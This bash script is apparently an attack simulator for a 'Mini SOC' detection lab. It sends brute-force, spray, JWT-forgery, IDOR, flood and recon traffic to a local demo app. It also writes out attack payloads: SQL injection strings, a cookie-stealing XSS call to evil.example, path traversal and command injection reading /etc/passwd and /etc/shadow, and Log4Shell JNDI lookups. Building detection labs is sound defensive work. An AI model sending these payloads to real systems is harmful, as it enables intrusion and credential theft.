#!/usr/bin/env bash
# Attack simulator for the Mini SOC lab. Generates benign traffic plus the
# suspicious patterns each detection rule looks for.
#
#   ./scripts/simulate-attacks.sh            # run every scenario
#   ./scripts/simulate-attacks.sh bruteforce # run one scenario
#
# Basic scenarios:    baseline bruteforce spray privesc idor tokens flood
# Advanced scenarios: takeover distributed hijack injection log4shell recon scanner scraping algnone
# Groups:             basic, advanced (default: everything)
#
# Only run this against your own lab environment.
set -euo pipefail
cd "$(dirname "$0")/.."

TARGET="${TARGET:-http://localhost:${TARGET_APP_PORT:-8080}}"
[[ -f .env ]] && set -a && source .env && set +a

: "${DEMO_ALICE_PASSWORD:?DEMO_ALICE_PASSWORD not set (create .env first)}"
: "${DEMO_BOB_PASSWORD:?DEMO_BOB_PASSWORD not set}"

say() { printf '\n\033[1;36m==> %s\033[0m\n' "$*"; }

# login <user> <password> [source-ip]  -> prints HTTP status
login_status() {
  curl -s -o /dev/null -w '%{http_code}' -X POST "$TARGET/api/auth/login" \
    -H 'Content-Type: application/json' -H "X-Forwarded-For: ${3:-10.0.0.10}" \
    -d "{\"username\":\"$1\",\"password\":\"$2\"}"
}

# token <user> <password> [source-ip] -> prints JWT
token() {
  curl -s -X POST "$TARGET/api/auth/login" -H 'Content-Type: application/json' \
    -H "X-Forwarded-For: ${3:-10.0.0.10}" -d "{\"username\":\"$1\",\"password\":\"$2\"}" \
    | sed -n 's/.*"accessToken":"\([^"]*\)".*/\1/p'
}

# call <method> <path> <token|-> <source-ip> -> prints HTTP status
call() {
  local auth=()
  [[ "$3" != "-" ]] && auth=(-H "Authorization: Bearer $3")
  curl -s -o /dev/null -w '%{http_code}' -X "$1" "$TARGET$2" "${auth[@]}" -H "X-Forwarded-For: $4"
}

baseline() {
  say "Baseline: normal user activity from 10.0.0.10-12"
  for ip in 10.0.0.10 10.0.0.11 10.0.0.12; do
    t=$(token alice "$DEMO_ALICE_PASSWORD" "$ip")
    for _ in 1 2 3; do printf '%s ' "$(call GET /api/orders "$t" "$ip")" "$(call GET /api/users/me "$t" "$ip")"; done
  done
  t=$(token bob "$DEMO_BOB_PASSWORD" 10.0.0.20)
  curl -s -o /dev/null -X POST "$TARGET/api/orders" -H "Authorization: Bearer $t" -H 'Content-Type: application/json' \
    -H 'X-Forwarded-For: 10.0.0.20' -d '{"item":"Webcam","quantity":1,"amount":59.90}'
  echo
}

bruteforce() {
  say "Brute force: 6 wrong passwords for 'alice' from 203.0.113.66 (rule BRUTE_FORCE_LOGIN, >=5 in 2m)"
  for i in $(seq 1 6); do printf '%s ' "$(login_status alice "guess-$i" 203.0.113.66)"; sleep 0.3; done
  echo
}

spray() {
  say "Password spray: 12 failures across many accounts from 198.51.100.23 (rule PASSWORD_SPRAY)"
  for u in alice bob admin root test guest alice bob admin svc_backup oracle postgres; do
    printf '%s ' "$(login_status "$u" 'Summer2026!' 198.51.100.23)"
  done
  echo
}

privesc() {
  say "Privilege escalation: 'bob' probing /api/admin (rule RESTRICTED_ENDPOINT_ACCESS)"
  t=$(token bob "$DEMO_BOB_PASSWORD" 172.16.5.40)
  for p in /api/admin/stats /api/admin/stats /api/users /api/admin/stats; do printf '%s ' "$(call GET "$p" "$t" 172.16.5.40)"; done
  printf '%s ' "$(call POST /api/admin/maintenance "$t" 172.16.5.40)"
  echo
}

idor() {
  say "IDOR: 'alice' enumerating other users' orders (rule IDOR_ATTEMPT)"
  t=$(token alice "$DEMO_ALICE_PASSWORD" 10.0.0.11)
  for id in 1001 1002 1003 1004 1003 1004; do printf '%s ' "$(call GET "/api/orders/$id" "$t" 10.0.0.11)"; done
  echo
}

tokens() {
  say "Token abuse: 12 forged JWTs from 192.0.2.50 (rule INVALID_TOKEN_ABUSE)"
  forged='eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGVzIjpbIlJPTEVfQURNSU4iXX0.forged-signature'
  for _ in $(seq 1 12); do printf '%s ' "$(call GET /api/admin/stats "$forged" 192.0.2.50)"; done
  echo
}

flood() {
  say "Request flood: 150 unauthenticated requests from 192.0.2.99 (rules HIGH_REQUEST_RATE + AUTH_ERROR_SPIKE)"
  for i in $(seq 1 150); do
    call GET /api/orders - 192.0.2.99 >/dev/null &
    (( i % 25 == 0 )) && wait && printf '%d ' "$i"
  done
  wait
  echo
}

# ---------------------------------------------------------------- advanced

# probe <source-ip> <user-agent> <path> [extra curl args...] -> prints HTTP status
probe() {
  local ip="$1" ua="$2" path="$3"; shift 3
  curl -s -o /dev/null -w '%{http_code}' -G "$TARGET$path" -H "X-Forwarded-For: $ip" -A "$ua" "$@"
}

takeover() {
  say "Account takeover: 6 failed logins for 'bob' then a SUCCESS from 45.155.205.233 (rule ACCOUNT_TAKEOVER)"
  for i in $(seq 1 6); do printf '%s ' "$(login_status bob "Winter202$i!" 45.155.205.233)"; done
  printf '%s ' "$(login_status bob "$DEMO_BOB_PASSWORD" 45.155.205.233)"
  t=$(token bob "$DEMO_BOB_PASSWORD" 45.155.205.233)
  printf '%s ' "$(call GET /api/orders "$t" 45.155.205.233)"
  echo
}

distributed() {
  say "Distributed brute force: 'admin' attacked from 6 botnet IPs, 1 attempt each (rule DISTRIBUTED_BRUTE_FORCE)"
  for n in 10 11 12 13 14 15; do printf '%s ' "$(login_status admin "P@ssw0rd$n" "5.188.62.$n")"; done
  echo
}

hijack() {
  say "Session hijack: alice's JWT stolen and replayed from 4 foreign IPs (rule SESSION_HIJACK)"
  t=$(token alice "$DEMO_ALICE_PASSWORD" 10.0.0.30)
  printf '%s ' "$(call GET /api/orders "$t" 10.0.0.30)"
  for ip in 185.220.101.4 103.75.190.11 91.240.118.172 45.95.147.236; do
    printf '%s ' "$(call GET /api/orders "$t" "$ip")" "$(call GET /api/users/me "$t" "$ip")"
  done
  echo
}

injection() {
  say "Injection: SQLi / XSS / path traversal / command injection payloads from 103.145.13.7 (rule INJECTION_ATTEMPT)"
  local ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
  printf '%s ' \
    "$(probe 103.145.13.7 "$ua" /api/orders --data-urlencode "id=1' OR '1'='1")" \
    "$(probe 103.145.13.7 "$ua" /api/orders --data-urlencode "q=1 UNION SELECT username, password FROM users--")" \
    "$(probe 103.145.13.7 "$ua" /api/orders --data-urlencode "id=1; SELECT pg_sleep(5)")" \
    "$(probe 103.145.13.7 "$ua" /api/users --data-urlencode "name=<script>document.location='http://evil.example/?c='+document.cookie</script>")" \
    "$(probe 103.145.13.7 "$ua" /api/orders --data-urlencode "file=../../../../etc/passwd")" \
    "$(probe 103.145.13.7 "$ua" /api/orders --data-urlencode "host=127.0.0.1; cat /etc/shadow")"
  echo
}

log4shell() {
  say "Log4Shell: \${jndi:ldap://...} lookup in headers from 45.83.64.1 (rule LOG4SHELL_EXPLOIT)"
  printf '%s ' \
    "$(probe 45.83.64.1 '${jndi:ldap://45.83.64.1:1389/Exploit}' /api/orders)" \
    "$(probe 45.83.64.1 'Mozilla/5.0' /api/orders -H 'X-Api-Version: ${${lower:j}ndi:ldap://45.83.64.1:1389/a}')"
  echo
}

recon() {
  say "Recon: directory/endpoint discovery of 12 well-known paths from 162.142.125.9 (rule RECON_PATH_SCAN)"
  for p in /.env /.git/config /wp-admin/ /wp-login.php /phpmyadmin/ /admin /server-status \
           /backup.zip /config.json /api/v1/users /swagger-ui.html /console; do
    printf '%s ' "$(probe 162.142.125.9 'Mozilla/5.0 (compatible; Recon/1.0)' "$p")"
  done
  echo
}

scanner() {
  say "Scanner: sqlmap and nuclei user agents from 194.26.29.110 (rule SCANNER_TOOL)"
  for i in 1 2 3; do
    printf '%s ' "$(probe 194.26.29.110 'sqlmap/1.8.4#stable (https://sqlmap.org)' /api/orders --data-urlencode "id=$i")"
    printf '%s ' "$(probe 194.26.29.110 'Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))' "/api/orders/$i")"
  done
  echo
}

scraping() {
  say "Data scraping: 'alice' reads her orders 45 times in a few seconds (rule DATA_SCRAPING)"
  t=$(token alice "$DEMO_ALICE_PASSWORD" 10.0.0.13)
  for i in $(seq 1 45); do
    call GET "/api/orders/$((1001 + i % 2))" "$t" 10.0.0.13 >/dev/null
    (( i % 15 == 0 )) && printf '%d ' "$i"
  done
  echo
}

algnone() {
  say "JWT forgery: unsigned alg=none token claiming ROLE_ADMIN from 192.0.2.77 (rule JWT_ALG_NONE)"
  # {"alg":"none"}.{"iss":"mini-soc-target-app","sub":"admin","roles":["ROLE_USER","ROLE_ADMIN"],"jti":"forged-alg-none"}.
  local none='eyJhbGciOiJub25lIn0.eyJpc3MiOiJtaW5pLXNvYy10YXJnZXQtYXBwIiwic3ViIjoiYWRtaW4iLCJyb2xlcyI6WyJST0xFX1VTRVIiLCJST0xFX0FETUlOIl0sImp0aSI6ImZvcmdlZC1hbGctbm9uZSJ9.'
  printf '%s ' "$(call GET /api/admin/stats "$none" 192.0.2.77)" "$(call GET /api/users "$none" 192.0.2.77)"
  echo
}

BASIC=(baseline bruteforce spray privesc idor tokens flood)
ADVANCED=(takeover distributed hijack injection log4shell recon scanner scraping algnone)

scenarios=()
for arg in "$@"; do
  case "$arg" in
    basic) scenarios+=("${BASIC[@]}") ;;
    advanced) scenarios+=("${ADVANCED[@]}") ;;
    *) scenarios+=("$arg") ;;
  esac
done
[[ ${#scenarios[@]} -eq 0 ]] && scenarios=("${BASIC[@]}" "${ADVANCED[@]}")

for s in "${scenarios[@]}"; do
  if [[ " ${BASIC[*]} ${ADVANCED[*]} " == *" $s "* ]]; then
    "$s"
  else
    echo "Unknown scenario: $s (valid: basic advanced ${BASIC[*]} ${ADVANCED[*]})"; exit 1
  fi
done

say "Done. Detections run every ${DETECTION_POLL_INTERVAL:-PT15S} (log shipping adds a few seconds)."
echo "Open the dashboard: http://localhost:${DASHBOARD_PORT:-3000}"
